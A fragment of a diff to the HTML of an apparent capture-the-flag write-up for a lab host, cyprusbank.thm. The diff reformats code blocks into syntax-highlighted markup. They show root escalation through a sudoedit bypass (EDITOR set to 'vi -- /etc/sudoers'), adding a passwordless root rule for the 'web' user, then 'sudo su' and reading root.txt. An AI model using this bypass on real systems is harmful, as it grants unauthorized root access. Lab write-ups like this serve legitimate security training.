+<span class="nf">%sudo</span><span class="w">   </span><span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">ALL</span><span class="o">:</span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">ALL</span>
+<span class="n">web</span><span class="w">     </span><span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="o">:</span><span class="w"> </span><span class="n">ALL</span>
+<span class="cp">## Uncomment to allow any user to run sudo if they know the password</span>
+<span class="cp">## of the user they are running the command as (root by default).</span>
+<span class="cp"># Defaults targetpw  # Ask for the password of the target user</span>
+<span class="cp"># ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with &#39;Defaults targett</span>
+<span class="n">pw</span><span class="err">&#39;</span>
 
-## Read drop-in files from /etc/sudoers.d
-@includedir /etc/sudoers.d
-~                                                                               
--- INSERT --                         
-</code></pre>
+<span class="cp">## Read drop-in files from /etc/sudoers.d</span>
+<span class="err">@</span><span class="n">includedir</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span><span class="p">.</span><span class="n">d</span>
+<span class="o">~</span><span class="w">                                                                               </span>
+<span class="o">--</span><span class="w"> </span><span class="n">INSERT</span><span class="w"> </span><span class="o">--</span><span class="w">                         </span>
+</code></pre></div>
 
-<pre class="codehilite"><code>web@cyprusbank:~$ export EDITOR=&quot;vi -- /etc/sudoers&quot;
-web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-sudo: sudoedit doesn't need to be run via sudo
-sudo: --: editing files in a writable directory is not permitted
-2 files to edit
-sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
-web@cyprusbank:~$ sudo su
-root@cyprusbank:/home/web# cd /root
-root@cyprusbank:~# ls
-clean.sh  root.txt
-root@cyprusbank:~# cat root.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">EDITOR</span><span class="o">=</span><span class="s2">&quot;vi -- /etc/sudoers&quot;</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t need to be run via sudo</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="o">--</span><span class="p">:</span><span class="w"> </span><span class="n">editing</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">permitted</span>
+<span class="mi">2</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">edit</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="n">unchanged</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">su</span>
+<span class="n">root</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">web</span><span class="c1"># cd /root</span>
+<span class="n">root</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~</span><span class="c1"># ls</span>
+<span class="n">clean</span><span class="o">.</span><span class="n">sh</span><span class="w">  </span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">root</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~</span><span class="c1"># cat root.txt</span>
+</code></pre></div>
         </div>
     </main>
 
